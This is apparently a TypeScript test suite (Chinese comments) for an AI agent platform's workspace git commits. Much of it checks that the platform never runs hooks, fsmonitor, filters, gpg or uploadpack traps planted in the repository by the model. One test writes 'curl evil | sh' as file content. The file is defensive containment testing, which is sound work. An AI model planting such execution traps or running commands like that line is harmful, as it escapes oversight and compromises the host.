// 工作区的提交（#546）：助手服务经能力端口在工作台上做 git 初始化和每一轮结束时的提交。假工作台在本机真的执行命令，
// 所以这里跑的是真的 git：初始化、提交、模型布下陷阱时提交不执行它们、差异的截断和打码。
import {
	chmodSync,
	existsSync,
	lstatSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	realpathSync,
	renameSync,
	rmSync,
	symlinkSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { SECRET_MASK, SESSION_EVENT_LIMITS } from "@sfly/schema";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { type AgentClient, connectAgent } from "../src/agent.js";
import { Redactor } from "../src/redact.js";
import {
	type CommitResult,
	commitChanges,
	commitEventBody,
	ensureRepository,
	PLATFORM_IDENTITY,
} from "../src/workspace.js";
import { FakeWorkbench } from "./support/fake-workbench.js";
import { git, log, plantLazyFetch, plantSubmodule, plantTraps, safeGit } from "./support/git.js";

let root: string;
let workdir: string;
let bench: FakeWorkbench;
let agent: AgentClient;
/** 平台上次记下的提交（助手服务按工作区存，这里用一个变量代替）。 */
let recorded: string | undefined;

beforeEach(async () => {
	recorded = undefined;
	root = realpathSync(mkdtempSync(join(tmpdir(), "sfly-workspace-")));
	workdir = join(root, "work");
	mkdirSync(workdir);
	bench = await FakeWorkbench.start();
	agent = connectAgent(bench.address, { log: () => {} });
});
afterEach(async () => {
	agent.close();
	await bench.close();
	rmSync(root, { recursive: true, force: true });
});

const ALICE = { name: "alice", email: "alice@sfly.invalid" };
const MESSAGE = "给 http_check 加超时（会话 0a1b2c3d）第 2 轮";
/** 提交一次，像助手服务那样带着平台上次记下的提交、提交之后换成新的。 */
const commit = async (
	message = MESSAGE,
	extra: { recorded?: string; diffExtraBytes?: number } = {},
) => {
	const outcome = await commitChanges(agent, workdir, {
		message,
		author: ALICE,
		recorded,
		...extra,
	});
	recorded = outcome.recorded;
	return outcome.result;
};
/** 初始化工作区，记下初次提交（助手服务做的）。 */
const initialize = async () => {
	const created = await ensureRepository(agent, workdir);
	recorded = created.recorded;
	return created;
};
/** 模型自己的 git：有身份。 */
const model = (...args: string[]) =>
	git(workdir, "-c", "user.name=m", "-c", "user.email=m@m.invalid", ...args);
const write = (path: string, content: string | Buffer) => {
	mkdirSync(join(workdir, path, ".."), { recursive: true });
	writeFileSync(join(workdir, path), content);
};
/** 当前提交里的文件（路径，排好序）。 */
const tracked = () =>
	safeGit(workdir, "ls-tree", "-r", "--name-only", "HEAD").split("\n").filter(Boolean);

describe("初始化工作区", () => {
	it("不是 git 仓库：git init、写 .gitignore、初次提交只含 .gitignore 和已有文件，不含 .agents/skills，节点包里的 .venv/ 没被提交", async () => {
		write("notes/a.txt", "已有的文件\n");
		write(".agents/skills/s/SKILL.md", "skill\n");
		write("pkg/.venv/lib/x.py", "venv\n");
		write("pkg/__pycache__/m.pyc", "cache\n");
		write("pkg/dist/out.whl", "dist\n");
		write("pkg/node.py", "print(1)\n");

		const created = await initialize();
		expect(created.created).toBe(true);
		// 初次提交的提交号交给调用方记下，当第一轮的基准。
		expect(created.recorded).toBe(safeGit(workdir, "rev-parse", "HEAD").trim());

		const ignore = readFileSync(join(workdir, ".gitignore"), "utf8").split("\n");
		for (const line of ["/.agents/skills/", ".venv/", "__pycache__/", "dist/"]) {
			expect(ignore).toContain(line);
		}
		expect(tracked()).toEqual([".gitignore", "notes/a.txt", "pkg/node.py"]);
		expect(log(workdir)).toEqual([
			`${PLATFORM_IDENTITY.name} | ${PLATFORM_IDENTITY.name} | 初始化工作区`,
		]);
		// 提交之后临时索引换成了真的索引：初始化出来的仓库里有 .git/index，`git status` 是干净的。
		expect(existsSync(join(workdir, ".git", "index"))).toBe(true);
		expect(safeGit(workdir, "status", "--porcelain", "--ignored=no")).toBe("");
	});

	it("已经是仓库：什么都不做（没有提交，.gitignore 不改）", async () => {
		git(workdir, "init", "-q", "-b", "main");
		write(".gitignore", "*.log\n");
		write("a.txt", "a\n");
		expect(await ensureRepository(agent, workdir)).toEqual({ created: false, recorded: undefined });
		expect(() => safeGit(workdir, "rev-parse", "-q", "--verify", "HEAD^{commit}")).toThrow();
		expect(readFileSync(join(workdir, ".gitignore"), "utf8")).toBe("*.log\n");
	});

	it("还不是仓库、已经有 .gitignore：补上缺的行（已有的那几行不重复），原来的行都在", async () => {
		write(".gitignore", "*.log\ndist/");
		await initialize();
		const lines = readFileSync(join(workdir, ".gitignore"), "utf8").split("\n").filter(Boolean);
		expect(lines).toContain("*.log");
		expect(lines.filter((l) => l === "dist/")).toHaveLength(1);
		expect(lines).toEqual(expect.arrayContaining(["/.agents/skills/", ".venv/", "__pycache__/"]));
		expect(tracked()).toEqual([".gitignore"]);
	});
});

describe("提交", () => {
	beforeEach(async () => {
		write("a.txt", "one\ntwo\n");
		write("gone.txt", "bye\n");
		await initialize();
	});

	it("改了、新增、删了文件：一个提交，作者是发起人、提交者是平台、说明照给的；文件有各自的增删行数，二进制是 null；差异是这个提交的", async () => {
		write("a.txt", "one\nTWO\nthree\n");
		write("sub/new.txt", "新文件\n");
		write("logo.png", Buffer.from([0, 1, 2, 0xff, 0]));
		rmSync(join(workdir, "gone.txt"));

		const result = await commit();
		expect(result).toBeDefined();
		const head = safeGit(workdir, "rev-parse", "HEAD").trim();
		expect(result?.hash).toBe(head);
		expect(log(workdir)[0]).toBe(`alice | ${PLATFORM_IDENTITY.name} | ${MESSAGE}`);
		expect(safeGit(workdir, "log", "-1", "--format=%ae|%ce").trim()).toBe(
			`${ALICE.email}|${PLATFORM_IDENTITY.email}`,
		);
		expect(result?.files).toEqual([
			{ path: "a.txt", additions: 2, deletions: 1 },
			{ path: "gone.txt", additions: 0, deletions: 1 },
			{ path: "logo.png", additions: null, deletions: null },
			{ path: "sub/new.txt", additions: 1, deletions: 0 },
		]);
		const diff = result?.diff.toString("utf8") ?? "";
		expect(result?.diffComplete).toBe(true);
		expect(diff).toContain("diff --git a/a.txt b/a.txt");
		expect(diff).toContain("+TWO");
		expect(diff).toContain("deleted file mode");
		expect(diff).toContain("+新文件");
		expect(diff).toContain("Binary files");
		// 事件里的差异就是这个提交的差异。
		expect(diff).toBe(
			safeGit(
				workdir,
				"-c",
				"core.quotePath=false",
				"diff-tree",
				"-p",
				"-r",
				"--no-commit-id",
				"--no-ext-diff",
				"--no-textconv",
				"HEAD",
			),
		);
		expect(tracked()).toEqual([".gitignore", "a.txt", "logo.png", "sub/new.txt"]);
		expect(safeGit(workdir, "show", "HEAD:a.txt")).toBe("one\nTWO\nthree\n");
		// 提交之后工作区是干净的：模型在工作台上 `git status` 看不到没提交的东西（临时索引换成了真的索引）。
		expect(safeGit(workdir, "status", "--porcelain")).toBe("");
	});

	it("没有改动：不提交（返回 undefined），已有的提交不变", async () => {
		const before = safeGit(workdir, "rev-parse", "HEAD");
		expect(await commit()).toBeUndefined();
		expect(safeGit(workdir, "rev-parse", "HEAD")).toBe(before);
		expect(log(workdir)).toHaveLength(1);
	});

	it("差异很大：只取上限加 diffExtraBytes 那么多字节，diffComplete 为 false；文件统计是完整的", async () => {
		write("big.txt", `${"y".repeat(99)}\n`.repeat(3000));
		const result = await commit(MESSAGE, { diffExtraBytes: 50 });
		expect(result?.files).toEqual([{ path: "big.txt", additions: 3000, deletions: 0 }]);
		expect(result?.diffComplete).toBe(false);
		expect(result?.diff.length).toBe(SESSION_EVENT_LIMITS.commitDiffBytes + 50);
		expect(result?.diff.toString("utf8")).toContain("+++ b/big.txt");
	});

	it(".agents/skills 不提交，.gitignore 被改掉、删掉也一样；.gitignore 和 .git/info/exclude 里的不提交", async () => {
		rmSync(join(workdir, ".gitignore"));
		write(".agents/skills/x/SKILL.md", "skill\n");
		write(".agents/skills/y.txt", "skill\n");
		write("pkg/.venv/lib.py", "venv\n");
		write("keep.txt", "keep\n");
		write("ignored.log", "excluded\n");
		write(".git/info/exclude", "*.log\n");

		const result = await commit();
		expect(result?.files.map((f) => f.path)).toEqual([
			".gitignore",
			"keep.txt",
			"pkg/.venv/lib.py",
		]);
		expect(tracked().some((p) => p.startsWith(".agents/skills"))).toBe(false);
		expect(tracked()).not.toContain("ignored.log");
	});

	it(".gitignore 写了 !.agents/skills/（取消忽略）也不提交；已经被忽略时也不报错", async () => {
		write(".gitignore", "!.agents/skills/\n");
		write(".agents/skills/x/SKILL.md", "skill\n");
		write("keep.txt", "keep\n");
		const result = await commit();
		expect(result?.files.map((f) => f.path)).toEqual([".gitignore", "keep.txt"]);
		expect(tracked().some((p) => p.startsWith(".agents/skills"))).toBe(false);
		// 再来一次：.gitignore 里有 .agents/skills/ 时（初始化写的就是这样）git add 也不因为它报错。
		write(".gitignore", ".agents/skills/\n");
		write("more.txt", "more\n");
		expect((await commit("第二个"))?.files.map((f) => f.path)).toEqual([".gitignore", "more.txt"]);
	});

	it("取差异的一步失败：分支没动（仓库里看不出这次提交），再提交一次照样成功", async () => {
		write("a.txt", "changed\n");
		const before = safeGit(workdir, "rev-parse", "HEAD");
		const broken: AgentClient = {
			...agent,
			run: (argv, options) =>
				argv.includes("diff-tree") ? Promise.resolve(1) : agent.run(argv, options),
		};
		await expect(
			commitChanges(broken, workdir, { message: MESSAGE, author: ALICE }),
		).rejects.toThrow(/git diff-tree/);
		expect(safeGit(workdir, "rev-parse", "HEAD")).toBe(before);
		expect(log(workdir)).toHaveLength(1);
		// 平台没有留下任何东西（暂存在临时仓库里、随它删掉）：下一次提交把这些改动提交上。
		const retry = await commit();
		expect(retry?.files).toEqual([{ path: "a.txt", additions: 1, deletions: 2 }]);
		expect(log(workdir)).toHaveLength(2);
	});

	it("提交的命令不带会话令牌，也不带助手服务给 pi 的环境：只有 git 自己的设置", async () => {
		write("b.txt", "b\n");
		await commit();
		expect(bench.runs.length).toBeGreaterThan(3);
		for (const run of bench.runs) {
			for (const key of Object.keys(run.env)) {
				expect(key, run.argv.join(" ")).toMatch(/^(GIT_|LC_ALL$)/);
			}
		}
		// 每条命令都显式关掉了仓库里的配置能触发的执行：不靠 .git/config。
		const staging = bench.runs.find((run) => run.argv.includes("add"));
		expect(staging?.argv.join(" ")).toContain("core.hooksPath=/dev/null");
		expect(staging?.argv.join(" ")).toContain("core.fsmonitor=false");
	});
});

describe("模型布下的陷阱：提交不执行工作区里能被模型改的任何东西", () => {
	it("陷阱是真的布好了：直接 git add、git commit 会触发钩子、fsmonitor、过滤器（对照）", async () => {
		await initialize();
		const traps = plantTraps(workdir);
		write("b.txt", "b\n");
		const attempt = (...args: string[]) => {
			try {
				git(workdir, "-c", "user.name=t", "-c", "user.email=t@t", ...args);
			} catch {
				// 有的陷阱（gpg）会让提交失败：标记文件照样留下。
			}
		};
		attempt("add", "-A");
		attempt("commit", "-q", "-m", "直接提交");
		// core.hooksPath 指到别处时 .git/hooks 里的不用：再用它们提交一次。
		attempt(
			"-c",
			`core.hooksPath=${join(workdir, ".git", "hooks")}`,
			"commit",
			"-q",
			"-m",
			"再来一次",
			"--allow-empty",
		);
		expect(traps.ran()).toEqual(
			expect.arrayContaining([
				"filter",
				"fsmonitor",
				"gpg",
				"hook-pre-commit",
				"hooksPath-pre-commit",
			]),
		);
	});

	it("钩子、core.hooksPath、fsmonitor、过滤器（.gitattributes 和 .git/info/attributes 两处）、textconv、外部 diff、gpg、include.path、includeIf、gc.auto：标记文件都不存在，提交成功", async () => {
		await initialize();
		const traps = plantTraps(workdir);
		write("a.txt", "改了\n");
		write("sub/b.txt", "新的\n");

		const result = await commit();
		// 嵌套仓库（父索引里有它的 gitlink、它自己配了过滤器和 fsmonitor）当作一个 gitlink 记下，不进去看。
		expect(result?.files.map((f) => f.path).sort()).toEqual([
			".gitattributes",
			"a.txt",
			"nested-repo",
			"sub/b.txt",
		]);
		expect(traps.ran()).toEqual([]);
		// 提交确实在仓库里，分支指向它。
		expect(safeGit(workdir, "rev-parse", "HEAD").trim()).toBe(result?.hash);
		expect(log(workdir)[0]).toBe(`alice | ${PLATFORM_IDENTITY.name} | ${MESSAGE}`);
		// 过滤器没有改写内容：存进去的就是工作区里的字节。
		expect(safeGit(workdir, "show", "--no-textconv", "HEAD:sub/b.txt")).toBe("新的\n");
	});

	it("初始化也不执行：仓库已经布了陷阱、还没有任何提交", async () => {
		git(workdir, "init", "-q", "-b", "main");
		const traps = plantTraps(workdir);
		write("a.txt", "a\n");
		// 已经是仓库：初始化什么都不做；第一次提交（没有父提交）同样不触发。
		expect((await ensureRepository(agent, workdir)).created).toBe(false);
		const result = await commit("第一个提交");
		expect(result?.hash).toBeDefined();
		expect(traps.ran()).toEqual([]);
	});
});

describe("模型布下的陷阱（续）：子模块、部分克隆、属性、索引、全局配置", () => {
	const EMPTY_TREE = "4b825dc642cb6eb9a060e54bf8d69288fbee4904";
	beforeEach(async () => {
		write("a.txt", "one\n");
		await initialize();
	});

	it("子模块：父仓库的索引里有它的 gitlink，它自己的过滤器和 fsmonitor 不执行；别的改动照常记", async () => {
		const traps = plantSubmodule(workdir);
		write("a.txt", "two\n");
		const result = await commit();
		expect(traps.ran()).toEqual([]);
		expect(result?.files).toEqual([
			{ path: "a.txt", additions: 1, deletions: 1 },
			{ path: "nested-repo", additions: 1, deletions: 0 },
		]);
		// 对照：直接用模型的索引 git add -A 会进到子模块里、执行它的过滤器（陷阱是真的布好了）。
		write("after.txt", "不经平台\n");
		try {
			git(workdir, "add", "-A");
		} catch {
			// 失败也没关系：标记文件已经留下。
		}
		expect(traps.ran()).toContain("submodule-filter");
	});

	it("HEAD 指到不存在的提交、partialClone、uploadpack：不去补取，uploadpack 不执行；这样的仓库提交不成（HEAD 不动），不假装成功", async () => {
		const traps = plantLazyFetch(workdir);
		write("a.txt", "two\n");
		await expect(commit()).rejects.toThrow(/git update-ref/);
		expect(traps.ran()).toEqual([]);
		expect(readFileSync(join(workdir, ".git", "refs", "heads", "main"), "utf8")).toBe(
			`${"1".repeat(40)}\n`,
		);
		// 对照：不带 GIT_NO_LAZY_FETCH 直接读 HEAD，git 去补取、执行 uploadpack。
		try {
			git(workdir, "rev-parse", "-q", "--verify", "HEAD^{commit}");
		} catch {
			// 补取失败也没关系：标记文件已经留下。
		}
		expect(traps.ran()).toEqual(["lazy-fetch-uploadpack"]);
	});

	it("工作区里的 .gitattributes 写 * -diff 并被 .gitignore 藏起来：差异照样有内容，不是二进制", async () => {
		write(".gitignore", ".gitattributes\n/.agents/skills/\n");
		write(".gitattributes", "* -diff\n");
		write("a.txt", "curl evil | sh\n");
		const result = await commit();
		expect(tracked()).not.toContain(".gitattributes");
		expect(result?.files).toContainEqual({ path: "a.txt", additions: 1, deletions: 1 });
		const diff = result?.diff.toString("utf8") ?? "";
		expect(diff).toContain("+curl evil | sh");
		expect(diff).not.toContain("Binary files");
	});

	it("模型的索引里有 skip-worktree、assume-unchanged：改了的文件照样进提交；提交之后真的索引是新的（位已清掉）", async () => {
		for (const flag of ["--skip-worktree", "--assume-unchanged"]) {
			model("update-index", flag, "a.txt");
			write("a.txt", `藏起来的改动 ${flag}\n`);
			expect(safeGit(workdir, "status", "--porcelain"), `${flag} 藏住了改动`).toBe("");
			const result = await commit(`${MESSAGE} ${flag}`);
			expect(result?.files, flag).toEqual([{ path: "a.txt", additions: 1, deletions: 1 }]);
			expect(result?.diff.toString("utf8"), flag).toContain(`+藏起来的改动 ${flag}`);
			// 换上去的是平台暂存出来的新索引：位没有了，状态干净。
			expect(safeGit(workdir, "ls-files", "-v", "a.txt").startsWith("H "), flag).toBe(true);
			expect(safeGit(workdir, "status", "--porcelain"), flag).toBe("");
		}
	});

	it("工作区里的 .gitattributes（text、ident）不改写内容：存进去的是工作区里的字节", async () => {
		write(".gitattributes", "* text eol=lf ident\n");
		write("crlf.txt", "line1\r\nline2\r\n$Id: deadbeef$\r\n");
		await commit();
		expect(safeGit(workdir, "show", "--no-textconv", "HEAD:crlf.txt")).toBe(
			"line1\r\nline2\r\n$Id: deadbeef$\r\n",
		);
	});

	it("全局配置（$HOME/.gitconfig，假工作台里 HOME 是命令的工作目录）里的设置不生效：core.autocrlf 没有改写内容", async () => {
		write(".gitconfig", "[core]\n\tautocrlf = true\n");
		write("crlf.txt", "a\r\nb\r\n");
		await commit();
		expect(safeGit(workdir, "show", "--no-textconv", "HEAD:crlf.txt")).toBe("a\r\nb\r\n");
	});

	it("每条 git 命令都不补取、不读全局和系统的配置；暂存用临时仓库里的空索引，暂存和取差异都不读工作区的属性", async () => {
		write("b.txt", "b\n");
		await commit();
		const gits = bench.runs.filter((run) => run.argv[0] === "git");
		expect(gits.length).toBeGreaterThan(8);
		for (const run of gits) {
			const what = run.argv.join(" ");
			expect(run.env.GIT_NO_LAZY_FETCH, what).toBe("1");
			expect(run.env.GIT_CONFIG_GLOBAL, what).toBe("/dev/null");
			expect(run.env.GIT_CONFIG_SYSTEM, what).toBe("/dev/null");
			expect(run.env.GIT_CONFIG_NOSYSTEM, what).toBe("1");
		}
		const stage = gits.find((run) => run.argv.includes("add"));
		expect(stage?.env.GIT_INDEX_FILE).toMatch(/^\/tmp\/sfly-commit\.[^/]+\/index$/);
		expect(stage?.env.GIT_DIR).toMatch(/^\/tmp\/sfly-commit\.[^/]+$/);
		expect(stage?.env.GIT_ATTR_SOURCE).toBe(EMPTY_TREE);
		const diffs = gits.filter((run) => run.argv.includes("diff-tree"));
		expect(diffs).toHaveLength(2);
		for (const run of diffs) expect(run.env.GIT_ATTR_SOURCE, run.argv.join(" ")).toBe(EMPTY_TREE);
		// 没有一条命令用模型的索引。
		expect(gits.some((run) => run.env.GIT_INDEX_FILE === join(workdir, ".git", "index"))).toBe(
			false,
		);
	});
});

describe("提交之后把临时索引换到真的索引的位置", () => {
	beforeEach(async () => {
		write("a.txt", "one\n");
		write("keep.txt", "k\n");
		await initialize();
	});

	it("平台提交之后工作区里 git status 是干净的；模型不带 add 的 git commit 不会把文件删掉", async () => {
		write("a.txt", "two\n");
		write("new.txt", "new\n");
		rmSync(join(workdir, "keep.txt"));
		await commit();
		expect(safeGit(workdir, "status", "--porcelain")).toBe("");
		const platform = safeGit(workdir, "rev-parse", "HEAD^{tree}").trim();
		// 模型接着用 git：没有 add 就提交（空提交），树和平台的一样，文件一个没少。
		model("commit", "-q", "--allow-empty", "-m", "模型的提交");
		expect(safeGit(workdir, "rev-parse", "HEAD^{tree}").trim()).toBe(platform);
		expect(tracked()).toEqual([".gitignore", "a.txt", "new.txt"]);
		// 模型自己改一个文件再 git commit -a：只有这个改动。
		write("a.txt", "three\n");
		model("commit", "-qam", "改 a");
		expect(safeGit(workdir, "show", "--format=", "--name-status", "HEAD").trim()).toBe("M\ta.txt");
	});

	it("模型已经暂存了一部分：换上来的是平台暂存出来的完整的索引，不是模型自己的", async () => {
		write("a.txt", "two\n");
		write("b.txt", "b\n");
		model("add", "b.txt"); // 模型自己的暂存
		await commit();
		expect(safeGit(workdir, "diff", "--cached", "--name-only")).toBe("");
		expect(safeGit(workdir, "status", "--porcelain")).toBe("");
	});

	it("没有改动：不提交，也不动真的索引（没有换索引的命令）", async () => {
		const index = join(workdir, ".git", "index");
		const before = readFileSync(index);
		const runs = bench.runs.length;
		expect(await commit()).toBeUndefined();
		expect(readFileSync(index).equals(before)).toBe(true);
		expect(
			bench.runs.slice(runs).filter((run) => run.argv[0] === "cp" || run.argv[0] === "mv"),
		).toEqual([]);
	});

	it("换不成（mv 失败）：提交和 update-ref 已经做成，结果照常返回，indexError 写原因，临时的副本删掉", async () => {
		write("a.txt", "two\n");
		const before = readFileSync(join(workdir, ".git", "index"));
		const broken: AgentClient = {
			...agent,
			run: (argv, options) => (argv[0] === "mv" ? Promise.resolve(1) : agent.run(argv, options)),
		};
		const outcome = await commitChanges(broken, workdir, {
			message: MESSAGE,
			author: ALICE,
			recorded,
		});
		expect(outcome.result?.files).toEqual([{ path: "a.txt", additions: 1, deletions: 1 }]);
		expect(outcome.recorded).toBe(safeGit(workdir, "rev-parse", "HEAD").trim());
		expect(outcome.indexError).toMatch(/mv 失败/);
		// 真的索引没动、没有留下副本。
		expect(readFileSync(join(workdir, ".git", "index")).equals(before)).toBe(true);
		expect(readdirSync(join(workdir, ".git")).filter((name) => name.includes(".sfly-"))).toEqual(
			[],
		);
	});

	it(".git/index 是符号链接：换掉的是链接本身，不写到它指向的地方", async () => {
		const outside = join(root, "outside-index");
		renameSync(join(workdir, ".git", "index"), outside);
		symlinkSync(outside, join(workdir, ".git", "index"));
		const before = readFileSync(outside);
		write("a.txt", "two\n");
		const outcome = await commitChanges(agent, workdir, {
			message: MESSAGE,
			author: ALICE,
			recorded,
		});
		expect(outcome.indexError).toBeUndefined();
		expect(readFileSync(outside).equals(before)).toBe(true);
		expect(lstatSync(join(workdir, ".git", "index")).isSymbolicLink()).toBe(false);
		expect(safeGit(workdir, "status", "--porcelain")).toBe("");
	});

	it("换索引的命令不是 git：没有钩子（post-index-change 不跑），名字里有随机串", async () => {
		const traps = plantTraps(workdir);
		write("a.txt", "two\n");
		const runs = bench.runs.length;
		await commit();
		expect(traps.ran()).toEqual([]);
		const swaps = bench.runs
			.slice(runs)
			.filter((run) => run.argv[0] === "cp" || run.argv[0] === "mv");
		expect(swaps.map((run) => run.argv[0])).toEqual(["cp", "mv"]);
		const copy = swaps[0]?.argv[2] as string;
		expect(copy).toMatch(/\/\.git\/index\.sfly-[0-9a-f]{12}$/);
		expect(swaps[1]?.argv).toEqual(["mv", "-f", copy, join(workdir, ".git", "index")]);
	});
});

describe("根目录的 .agents/skills", () => {
	beforeEach(async () => {
		write("a.txt", "one\n");
		await initialize();
	});

	it("节点包里的 .agents/skills/（sfly init 放进去的）照常提交，只有根目录的不提交", async () => {
		write("pkg/.agents/skills/s/SKILL.md", "包里的 skill\n");
		write(".agents/skills/x/SKILL.md", "平台放的\n");
		const result = await commit();
		expect(result?.files.map((f) => f.path)).toEqual(["pkg/.agents/skills/s/SKILL.md"]);
		expect(readFileSync(join(workdir, ".gitignore"), "utf8")).toContain("/.agents/skills/\n");
	});

	it("模型自己提交进去的根目录 .agents/skills：平台的提交里没有它", async () => {
		write(".agents/skills/x/SKILL.md", "skill\n");
		model("add", "-f", ".agents");
		model("commit", "-qm", "模型把 skill 提交了");
		write("keep.txt", "k\n");
		const result = await commit();
		expect(result?.files.map((f) => f.path)).toEqual(["keep.txt"]);
		expect(tracked().some((p) => p.startsWith(".agents/skills"))).toBe(false);
	});
});

describe("基准是平台自己上次记下的提交，不是 HEAD", () => {
	beforeEach(async () => {
		write("a.txt", "one\n");
		write("keep.txt", "k\n");
		await initialize();
	});

	it("模型自己提交了全部改动：这一轮照样记下（文件、差异）；平台的提交接在模型的后面，树和模型的一样", async () => {
		write("a.txt", "two\n");
		write("b.txt", "new\n");
		model("add", "-A");
		model("commit", "-qm", "我自己提交");
		const mine = safeGit(workdir, "rev-parse", "HEAD").trim();
		const result = await commit();
		expect(result?.files).toEqual([
			{ path: "a.txt", additions: 1, deletions: 1 },
			{ path: "b.txt", additions: 1, deletions: 0 },
		]);
		expect(result?.diff.toString("utf8")).toContain("+two");
		expect(result?.note).toBeUndefined();
		expect(safeGit(workdir, "rev-parse", "HEAD~1").trim()).toBe(mine);
		expect(safeGit(workdir, "rev-parse", "HEAD^{tree}").trim()).toBe(
			safeGit(workdir, "rev-parse", `${mine}^{tree}`).trim(),
		);
		expect(log(workdir)[0]).toBe(`alice | ${PLATFORM_IDENTITY.name} | ${MESSAGE}`);
	});

	it("只提交了一部分：记全部的改动", async () => {
		write("a.txt", "two\n");
		write("c.txt", "c\n");
		write("d.txt", "d\n");
		model("add", "c.txt");
		model("commit", "-qm", "只提交 c");
		const result = await commit();
		expect(result?.files.map((f) => f.path)).toEqual(["a.txt", "c.txt", "d.txt"]);
	});

	it("git reset --hard 退回去：这些文件记成被删掉", async () => {
		write("b.txt", "new\n");
		await commit("第一次");
		// 模型自己 reset --hard：真的索引是平台提交之后换上来的，里面有这些文件，reset 才会把它们删掉。
		model("reset", "--hard", "HEAD~1");
		expect(existsSync(join(workdir, "b.txt"))).toBe(false);
		const result = await commit("第二次");
		expect(result?.files).toEqual([{ path: "b.txt", additions: 0, deletions: 1 }]);
		expect(result?.diff.toString("utf8")).toContain("deleted file mode");
	});

	it("改写历史（reset、amend）之后再提交：以前的提交号不变，这一次按平台上次的提交算", async () => {
		write("a.txt", "two\n");
		const first = await commit("第一次");
		model("reset", "--hard", "HEAD~1");
		write("other.txt", "改写了\n");
		model("add", "-A");
		model("commit", "-q", "--amend", "-m", "改写了");
		// 和平台上次记下的比：a.txt 回到 one（改了一行）、多了 other.txt；不是和改写后的 HEAD 比。
		const second = await commit("第二次");
		expect(second?.files).toEqual([
			{ path: "a.txt", additions: 1, deletions: 1 },
			{ path: "other.txt", additions: 1, deletions: 0 },
		]);
		expect(second?.hash).not.toBe(first?.hash);
		expect(recorded).toBe(second?.hash);
	});

	it("没有改动：不提交，基准不变", async () => {
		const before = recorded;
		expect(await commit()).toBeUndefined();
		expect(recorded).toBe(before);
	});

	it("没有改动、模型自己提交过：树和平台上次记下的一样，不提交（基准不变）", async () => {
		write("a.txt", "two\n");
		await commit("第一次");
		const before = recorded;
		model("commit", "-q", "--allow-empty", "-m", "模型的空提交");
		expect(await commit()).toBeUndefined();
		expect(recorded).toBe(before);
	});

	it("从没记过（助手服务的数据目录丢了）：退回和 HEAD 比，差异开头写明；没有改动时基准记成 HEAD", async () => {
		write("a.txt", "two\n");
		const result = await commit(MESSAGE, { recorded: undefined });
		expect(result?.files).toEqual([{ path: "a.txt", additions: 1, deletions: 1 }]);
		expect(result?.note).toBe(
			`（平台还没有记过这个工作区的提交，下面是和仓库当前提交（${safeGit(workdir, "rev-parse", "--short=7", "HEAD~1").trim()}）的差异）\n`,
		);
		recorded = undefined;
		const none = await commitChanges(agent, workdir, { message: MESSAGE, author: ALICE });
		expect(none.result).toBeUndefined();
		expect(none.recorded).toBe(safeGit(workdir, "rev-parse", "HEAD").trim());
	});

	it("记下的提交不在仓库里了：退回和 HEAD 比，差异开头写明", async () => {
		write("a.txt", "two\n");
		const result = await commit(MESSAGE, { recorded: "2".repeat(40) });
		expect(result?.files).toEqual([{ path: "a.txt", additions: 1, deletions: 1 }]);
		expect(result?.note).toContain("平台上次记下的提交读不出来");
		const event = commitEventBody(1, result as CommitResult, new Redactor());
		expect(event.diff.startsWith(result?.note as string)).toBe(true);
		expect(event.diff).toContain("+two");
	});

	/** 平台记下一个提交（把 a.txt 改成 two），模型接着 reset --hard 回到初始提交：HEAD 的树和平台记下的树不同。返回平台那个提交。 */
	const recordedThenReset = async () => {
		write("a.txt", "two\n");
		const first = (await commit("第一次"))?.hash as string;
		model("reset", "--hard", "HEAD~1");
		return first;
	};
	const looseObject = (id: string) => join(workdir, ".git", "objects", id.slice(0, 2), id.slice(2));
	const expectFellBackToHead = (result: CommitResult | undefined) => {
		expect(result?.note).toContain("平台上次记下的提交读不出来");
		// 和 HEAD（初始提交：a.txt 是 one）比。
		expect(result?.files).toEqual([{ path: "a.txt", additions: 1, deletions: 1 }]);
		expect(result?.diff.toString("utf8")).toContain("-one");
		expect(result?.diff.toString("utf8")).toContain("+three");
	};

	it("记下的提交在、它的树不在（模型删了对象）：退回和 HEAD 比，差异开头写明，不抛错；以后的提交照常", async () => {
		const first = await recordedThenReset();
		const tree = safeGit(workdir, "rev-parse", `${first}^{tree}`).trim();
		rmSync(looseObject(tree));
		write("a.txt", "three\n");
		expectFellBackToHead(await commit("第二次"));
		// 基准换成了新的提交，下一轮没有说明行。
		write("a.txt", "four\n");
		const next = await commit("第三次");
		expect(next?.note).toBeUndefined();
		expect(next?.files).toEqual([{ path: "a.txt", additions: 1, deletions: 1 }]);
	});

	it("记下的提交的树里、取差异要读的文件对象被删了：退回和 HEAD 比，差异开头写明，不抛错", async () => {
		const first = await recordedThenReset();
		rmSync(looseObject(safeGit(workdir, "rev-parse", `${first}:a.txt`).trim()));
		write("a.txt", "three\n");
		expectFellBackToHead(await commit("第二次"));
	});

	it("记下的提交对象被写坏了：退回和 HEAD 比，差异开头写明，不抛错", async () => {
		const first = await recordedThenReset();
		chmodSync(looseObject(first), 0o644);
		writeFileSync(looseObject(first), "不是 git 对象");
		write("a.txt", "three\n");
		expectFellBackToHead(await commit("第二次"));
	});

	it("HEAD 的树也读不出来（仓库坏了）：抛错，不假装成功，分支不动", async () => {
		await recordedThenReset();
		const head = safeGit(workdir, "rev-parse", "HEAD").trim();
		rmSync(looseObject(safeGit(workdir, "rev-parse", "HEAD^{tree}").trim()));
		write("a.txt", "three\n");
		recorded = "2".repeat(40);
		await expect(commit("第二次")).rejects.toThrow(/git (rev-parse|diff-tree)/);
		expect(safeGit(workdir, "rev-parse", "HEAD").trim()).toBe(head);
	});

	it("还没有提交的仓库（HEAD 没出生）：和空仓库比，说明里这么写", async () => {
		rmSync(join(workdir, ".git"), { recursive: true, force: true });
		git(workdir, "init", "-q", "-b", "main");
		recorded = undefined;
		write("only.txt", "x\n");
		const result = await commit("第一个");
		expect(result?.note).toContain("和空仓库的差异");
		expect(result?.files.map((f) => f.path)).toContain("only.txt");
		expect(safeGit(workdir, "rev-list", "--count", "HEAD").trim()).toBe("1");
	});
});

describe("事件里的差异", () => {
	const LIMIT = SESSION_EVENT_LIMITS.commitDiffBytes;
	const result = (diff: string | Buffer, complete = true): CommitResult => ({
		hash: "a".repeat(40),
		files: [{ path: "a.txt", additions: 1, deletions: 0 }],
		diff: Buffer.from(diff),
		diffComplete: complete,
	});

	it("不超过上限：原样放进事件，不标截断", () => {
		const event = commitEventBody(3, result("diff --git a/a b/a\n+x\n"), new Redactor());
		expect(event).toMatchObject({
			type: "platform",
			kind: "commit",
			turn: 3,
			hash: "a".repeat(40),
